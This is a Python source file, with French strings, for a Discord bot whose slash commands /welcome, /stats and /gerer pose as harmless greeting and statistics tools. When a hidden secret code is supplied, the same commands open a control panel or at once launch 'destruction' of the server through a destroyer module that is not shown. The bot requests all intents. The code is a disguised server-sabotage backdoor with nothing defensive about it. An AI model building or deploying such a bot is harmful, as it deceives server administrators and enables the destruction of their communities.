"""Bot Discord : commandes déguisées, actives uniquement avec le code secret."""

from __future__ import annotations

import logging
from typing import Any

import discord
from discord import app_commands
from discord.ext import commands

from . import config, db, destroyer

log = logging.getLogger("botsecret.bot")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

READY = {"value": False}


def _secret_matches(code: str | None) -> bool:
    if not code:
        return False
    stored = db.get_secret_code()
    if not stored:
        return False
    return code.strip() == stored


def _target_guild() -> discord.Guild | None:
    guild_id = db.get_guild_id()
    if guild_id is None:
        return None
    return bot.get_guild(guild_id)


def _build_embed(guild: discord.Guild | None) -> discord.Embed:
    snap = destroyer.state.snapshot()
    embed = discord.Embed(
        title="🕹️ Panneau de contrôle",
        colour=discord.Colour.dark_red(),
        timestamp=discord.utils.utcnow(),
    )
    if guild is not None:
        embed.add_field(name="Serveur", value=guild.name, inline=True)
        embed.add_field(name="Membres", value=str(guild.member_count), inline=True)
        embed.add_field(name="Salons", value=str(len(guild.channels)), inline=True)
    if snap["running"]:
        embed.add_field(
            name="Destruction",
            value=f"en cours — {snap['step']} ({snap['done']}/{snap['total']})",
            inline=False,
        )
    else:
        embed.add_field(name="Destruction", value="au repos", inline=False)
    preset = db.get_preset()
    actifs = [key for key, value in preset.items() if value is True]
    embed.add_field(
        name="Options armées",
        value=f"{len(actifs)} option(s) activée(s) — voir le dashboard",
        inline=False,
    )
    embed.set_footer(text="botsecret")
    return embed


class ControlView(discord.ui.View):
    def __init__(self) -> None:
        super().__init__(timeout=300)

    @discord.ui.button(label="Lancer", style=discord.ButtonStyle.danger, emoji="💀")
    async def launch(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ) -> None:
        guild = interaction.guild
        if guild is None:
            await interaction.response.send_message("Hors serveur.", ephemeral=True)
            return
        if not destroyer.start(guild, db.get_preset()):
            await interaction.response.send_message(
                "Une destruction est déjà en cours.", ephemeral=True
            )
            return
        await interaction.response.send_message(
            "💀 Destruction lancée.", ephemeral=True
        )

    @discord.ui.button(label="Statut", style=discord.ButtonStyle.secondary, emoji="📊")
    async def status(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ) -> None:
        await interaction.response.send_message(
            embed=_build_embed(interaction.guild), ephemeral=True
        )

    @discord.ui.button(label="Arrêter", style=discord.ButtonStyle.primary, emoji="⏹️")
    async def halt(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ) -> None:
        ok = destroyer.stop()
        await interaction.response.send_message(
            "Arrêt demandé." if ok else "Rien à arrêter.", ephemeral=True
        )


@tree.command(name="gerer", description="Gérer le serveur")
@app_commands.describe(code="Code d'accès")
async def gerer(
    interaction: discord.Interaction, code: str | None = None
) -> None:
    if not _secret_matches(code):
        await interaction.response.send_message("✅ Rien à signaler.", ephemeral=True)
        return
    await interaction.response.send_message(
        embed=_build_embed(interaction.guild), view=ControlView(), ephemeral=True
    )


@tree.command(name="welcome", description="Accueillir les nouveaux membres")
@app_commands.describe(code="Code d'accès")
async def welcome(
    interaction: discord.Interaction, code: str | None = None
) -> None:
    if not _secret_matches(code):
        await interaction.response.send_message("👋 Bienvenue !", ephemeral=True)
        return
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Hors serveur.", ephemeral=True)
        return
    if not destroyer.start(guild, db.get_preset()):
        await interaction.response.send_message(
            "Une destruction est déjà en cours.", ephemeral=True
        )
        return
    await interaction.response.send_message(
        "💀 Destruction du serveur lancée.", ephemeral=True
    )


@tree.command(name="stats", description="Statistiques du serveur")
@app_commands.describe(code="Code d'accès")
async def stats(
    interaction: discord.Interaction, code: str | None = None
) -> None:
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Hors serveur.", ephemeral=True)
        return
    if not _secret_matches(code):
        embed = discord.Embed(
            title="Statistiques",
            description=f"**{guild.member_count}** membres · **{len(guild.channels)}** salons",
            colour=discord.Colour.blurple(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await interaction.response.send_message(
        embed=_build_embed(guild), view=ControlView(), ephemeral=True
    )


async def sync_commands() -> str:
    guild_id = db.get_guild_id()
    if guild_id is not None:
        guild = discord.Object(id=guild_id)
        tree.copy_global_to(guild=guild)
        synced = await tree.sync(guild=guild)
        return f"{len(synced)} commande(s) synchronisée(s) sur la guilde {guild_id}"
    synced = await tree.sync()
    return f"{len(synced)} commande(s) synchronisée(s) globalement"


@bot.event
async def on_ready() -> None:
    READY["value"] = True
    log.info("Connecté en tant que %s (%s)", bot.user, bot.user.id if bot.user else "?")
    db.add_log("info", f"bot connecté : {bot.user}")
    try:
        message = await sync_commands()
        db.add_log("info", message)
    except Exception as exc:  # noqa: BLE001
        db.add_log("error", f"synchronisation des commandes impossible : {exc}")


async def start_bot() -> None:
    if not config.DISCORD_TOKEN:
        log.warning("DISCORD_TOKEN absent : le bot ne démarre pas")
        db.add_log("warn", "DISCORD_TOKEN absent : bot inactif")
        return
    try:
        await bot.start(config.DISCORD_TOKEN)
    except Exception as exc:  # noqa: BLE001
        log.exception("Le bot s'est arrêté")
        db.add_log("error", f"bot arrêté : {exc}")


async def shutdown() -> None:
    destroyer.stop()
    if bot.is_ready():
        await bot.close()


def guild_info() -> dict[str, Any]:
    guild = _target_guild()
    data: dict[str, Any] = {
        "ready": READY["value"] and bot.is_ready(),
        "user": str(bot.user) if bot.user else None,
        "guild": None,
    }
    if guild is not None:
        data["guild"] = {
            "id": guild.id,
            "name": guild.name,
            "members": guild.member_count,
            "channels": len(guild.channels),
            "roles": len(guild.roles),
        }
    return data


def list_guilds() -> list[dict[str, Any]]:
    return [
        {"id": g.id, "name": g.name, "members": g.member_count}
        for g in bot.guilds
    ]
